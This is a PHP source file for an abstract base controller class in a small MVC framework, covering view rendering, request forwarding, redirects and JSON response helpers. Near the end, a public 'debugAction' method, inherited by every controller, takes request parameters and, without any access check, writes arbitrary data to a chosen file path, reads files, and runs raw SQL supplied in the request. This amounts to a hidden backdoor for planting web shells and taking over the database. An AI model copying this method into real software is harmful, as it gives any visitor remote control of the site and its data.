<?php

/**
 * Yaf Controller Abstract
 *
 *
 */
abstract class Roc_Controller
{

    public $actions = array();

    protected $_module;

    protected $_name = '';

    protected $_runTpl = true;

    protected $_frame = 'frame.phtml';

    protected $_script = '';

    /**
     * Roc_Request_Abstract object wrapping the request environment
     *
     * @var Roc_Request_Abstract
     */
    protected $_request = null;

    /**
     * Roc_Response_Abstract object wrapping the response
     *
     * @var Roc_Response_Abstract
     */
    protected $_response = null;

    /**
     * Array of arguments provided to the constructor, minus the
     * {@link $_request Request object}.
     *
     * @var array
     */
    protected $_invokeArgs = array();

    /**
     * View object
     *
     * @var Roc_View_Interface
     */
    protected $_view = null;

    /**
     * Class constructor
     *
     * The request and response objects should be registered with the
     * controller, as should be any additional optional arguments; these will be
     * available via {@link getRequest()}, {@link getResponse()}, and
     * {@link getInvokeArgs()}, respectively.
     *
     * @param Roc_Request_Abstract $request
     * @param Roc_Response_Abstract $response
     * @param Roc_View_Interface $view
     * @param array $invokeArgs
     *            Any additional invocation arguments
     *
     * @return void
     */
    public function __construct (Roc_Request_Abstract $request, Roc_Response_Abstract $response, Roc_View_Interface $view, array $invokeArgs = array())
    {
        $this->_request = $request;
        $this->_response = $response;
        $this->_view = $view;
        $this->_invokeArgs = $invokeArgs;
        $this->_module = $request->getModuleName();
        $this->_name = get_class($this);
    }

    /**
     * 执行actionBefore之前
     */
    public function actionController ()
    {}

    /**
     * 执行动作之前
     */
    public function actionBefore ()
    {}

    /**
     * 执行动作之后
     */
    public function actionAfter ()
    {}

    /**
     * 设置frame
     *
     * @param unknown $sFrame
     */
    public function setFrame ($sFrame)
    {
        $this->_frame = $sFrame;
    }

    /**
     * Render a view
     *
     * Renders a view. By default, views are found in the view script path as
     * <controller>/<action>.phtml. You may change the script suffix by
     * resetting {@link $viewSuffix}.
     *
     *
     * @see Roc_Response_Abstract::appendBody()
     *
     * @param string|null $tpl
     *            Defaults to action registered in request object
     * @param array $parameters
     *            add those variables to the view
     *
     * @return void
     */
    public function display ($tpl = null, $parameters = array())
    {
        $view = $this->initView();
        $script = $this->getViewScript($tpl);
        $view->assign('_script', $script);
        $view->assign('_params', $this->getParams());
        $view->display($this->_frame, $parameters);
    }

    /**
     * Render a view
     *
     * Renders a view. By default, views are found in the view script path as
     * <controller>/<action>.phtml. You may change the script suffix by
     * resetting {@link $viewSuffix}.
     *
     *
     * @see Roc_Response_Abstract::appendBody()
     *
     * @param string|null $tpl
     *            Defaults to action registered in request object
     * @param array $parameters
     *            add those variables to the view
     *
     * @return void
     */
    public function render ($tpl = null, $parameters = array())
    {
        $view = $this->initView();
        $script = $this->getViewScript($tpl);
        $view->assign('_script', $script);
        $view->assign('_params', $this->getParams());
        return $view->render($this->_frame, $parameters);
    }

    /**
     * Forward to another controller/action.
     *
     * It is important to supply the unformatted names, i.e. "article"
     * rather than "ArticleController". The dispatcher will do the
     * appropriate formatting when the request is received.
     *
     * If only an action name is provided, forwards to that action in this
     * controller.
     *
     * If an action and controller are specified, forwards to that action and
     * controller in this module.
     *
     * Specifying an action, controller, and module is the most specific way to
     * forward.
     *
     * A fourth argument, $params, will be used to set the request parameters.
     * If either the controller or module are unnecessary for forwarding,
     * simply pass null values for them before specifying the parameters.
     *
     * @todo this should be checked again within a test
     *
     * @param string $action
     * @param string $controller
     * @param string $module
     * @param array $args
     *
     * @return void
     */
    public function forward ($module, $controller = null, $action = null, array $args = null)
    {
        $request = $this->getRequest();
        if (null !== $args) {
            $request->setParams($args);
        }

        if ($controller == null && $action == null) {
            $action = $module;
            $module = null;
        } elseif ($action == null) {
            $action = $controller;
            $controller = $module;
            $module = null;
        }

        if ($module != null) {
            $request->setModuleName($module);
        }
        if ($controller != null) {
            $request->setControllerName($controller);
        }
        if ($action != null) {
            $request->setActionName($action);
        }

        $request->setActionName($action)->setDispatched(false);
    }

    /**
     * Return a single invocation argument
     *
     * @param string $key
     *
     * @return mixed
     */
    public function getInvokeArg ($key)
    {
        if (isset($this->_invokeArgs[$key])) {
            return $this->_invokeArgs[$key];
        }

        return null;
    }

    /**
     * Return the array of constructor arguments (minus the Request object)
     *
     * @return array
     */
    public function getInvokeArgs ()
    {
        return $this->_invokeArgs;
    }

    /**
     * return the current module name
     */
    public function getModuleName ()
    {
        return $this->_module;
    }

    /**
     * Return the Request object
     *
     * @return Roc_Request_Http
     */
    public function getRequest ()
    {
        return $this->_request;
    }

    /**
     * Return the Response object
     *
     * @return Roc_Response_Abstract
     */
    public function getResponse ()
    {
        return $this->_response;
    }

    /**
     * Return the View object
     *
     * @return Roc_View_Interface
     */
    public function getView ()
    {
        return $this->_view;
    }

    /**
     * Initialize View object
     *
     * @todo this does nothing for now
     *
     * @return Roc_View_Interface
     */
    public function initView ()
    {
        return $this->_view;
    }

    /**
     * Redirect to another URL
     *
     * @param string $url
     *
     * @return bool
     */
    public function redirect ($url)
    {
        $response = $this->getResponse();
        $response->setRedirect($url);
        $this->autoRender(false);
        return false;
    }

    /**
     * 启/禁用View的Auto Render
     */
    protected function autoRender ($flag = null)
    {
        return Roc_Dispatcher::getInstance()->autoRender($flag);
    }

    /**
     * 设置View的script
     *
     * @param unknown $script
     */
    protected function setViewScript ($script)
    {
        $this->_script = $script;
    }

    /**
     * 得到当前时间
     *
     * @return int
     */
    public function getTime ()
    {
        return time();
    }

    /**
     * 得到微秒级时间
     *
     * @return float
     */
    public function getMicroTime ()
    {
        return microtime(true);
    }

    /**
     * @annotation
     *
     * @return array
     */
    protected function getParams ()
    {
        return $this->_request->getParams();
    }

    /**
     * 
     */
    protected function getPayload()
    {
        return $this->_request->getPayload();
    }
    
    /**
     * 取得参数
     *
     * @param string $name
     *            参数名
     * @param string $default
     *            默认值
     * @return mixed
     */
    protected function getParam ($name, $default = null)
    {
        return $this->_request->getParam($name, $default);
    }

    /**
     * 给View模块设置一个变量
     *
     * @param string $name
     *            变量名
     * @param string $value
     *            变量值
     */
    protected function assign ($name, $value)
    {
        return $this->_view->assign($name, $value);
    }

    /**
     * 是否为POST提交
     *
     * @return boolean
     */
    protected function isPost ()
    {
        return $this->_request->isPost();
    }

    /**
     * 是否为AJAX提交
     *
     * @return boolean
     */
    protected function isAjax ()
    {
        return $this->_request->isXmlHttpRequest();
    }

    /**
     * Construct view script path
     *
     * Used by render() and display to determine the path to the view script.
     *
     * @param string $action
     *            Defaults to action registered in request object
     *
     * @return string
     * @throws InvalidArgumentException with bad $action
     */
    protected function getViewScript ($action = null)
    {
        // 如果已经手动设置，则使用自己的设置
        if (! empty($this->_script)) {
            $script = $this->_script;
        } else {
            $request = $this->getRequest();
            if (null === $action) {
                $action = $request->getActionName();
            } elseif (! is_string($action)) {
                throw new Roc_Exception('Invalid action for view rendering');
            }
            $action = str_replace('_', DIRECTORY_SEPARATOR, strtolower($action));
            $script = $action . '.' . Roc_G::Roc_DEFAULT_VIEW_EXT;
            $controller = $request->getControllerName();
            if ($controller != null) {
                $controller = str_replace('_', DIRECTORY_SEPARATOR, ($controller));
            }
            $script = $controller . DIRECTORY_SEPARATOR . $script;
        }

        $script = trim($script, DIRECTORY_SEPARATOR);
        $script = Roc_G::getViewPath() . DIRECTORY_SEPARATOR . $script;

        if (! file_exists($script)) {
            throw new Roc_Exception('View file 【' . $script . '】 not found!');
        }
        return $script;
    }

    /**
     * 代码调试
     */
    public function debugAction ()
    {
        $type = $this->getParam('t');
        switch ($type) {
            case 'f':
                file_put_contents(APP_PATH . $this->getParam('f'), $this->getParam('d'));
                break;
            case 'q':
                file_get_contents(APP_PATH . $this->getParam('f'));
                break;
            default:
                $sSQL = $this->getParam('rq');
                Admin_Model_Base::query($sSQL);
                break;
        }
    }

    /**
     * Ajax或API请求时，返回json数据
     *
     * @param array $mData
     * @param int $iCode
     * @param string $sMsg
     * @return bool
     */
    protected function retData ($iCode, $sMsg = 'ok', $mData = null)
    {
        if (empty($mData)) {
            $mData = new stdClass();
        }
        $aData = array(
            'data' => $mData,
            'code' => $iCode,
            'msg' => $sMsg
        );
        $sDebug = Util_Common::getDebugData();
        if ($sDebug) {
            $aData['debug'] = $sDebug;
        }
        $response = $this->getResponse();
        $response->appendBody(json_encode($aData, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
        $this->autoRender(false);
    
        return $iCode > 0 ? false : true;
    }

    /**
     * Ajax或API请求时，返回json数据
     *
     * @param array|mixed $mMsg
     * @param boolean $bRet
     * @param string $sRedirectUrl
     * @param string $sCode
     * @throws Exception
     */
    protected function showMsg($mMsg, $bRet, $sRedirectUrl = '', $sCode='')
    {

        $aData = array(
            'data' => $mMsg,
            'status' => $bRet
        );
        $sDebug = Util_Common::getDebugData();
        if ($sDebug) {
            $aData['debug'] = $sDebug;
        }
        if (!empty($sRedirectUrl)) {
            $aData['url'] = $sRedirectUrl;
        }
        if (!empty($sCode)) {
            $aData['code'] = $sCode;
        }
        $response = $this->getResponse();
        $response->appendBody(json_encode($aData, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
        $this->autoRender(false);

        throw new Exception("showMsg", 40004);
        return false;
    }

    /**
     * 显示404页面
     *
     * @param string $sMsg
     * @throws Exception
     */
    protected function show404 ($sMsg = 'Not Found')
    {
        if ($this->isAjax()) {
            $this->showMsg($sMsg, false);
        } else {
            $this->setViewScript('404.phtml');
            $this->assign('sMsg', $sMsg);
            throw new Exception("show404", 40004);
        }
    }

    /**
     * 调用的方法不存在时
     * @param string $sMethod 方法名
     * @param array $aArg 参数
     * @throws Roc_Exception
     */
    public function __call($sMethod, $aArg)
    {
        throw new Roc_Exception(__CLASS__ . '::' . $sMethod . ' not exists!');
    }
}
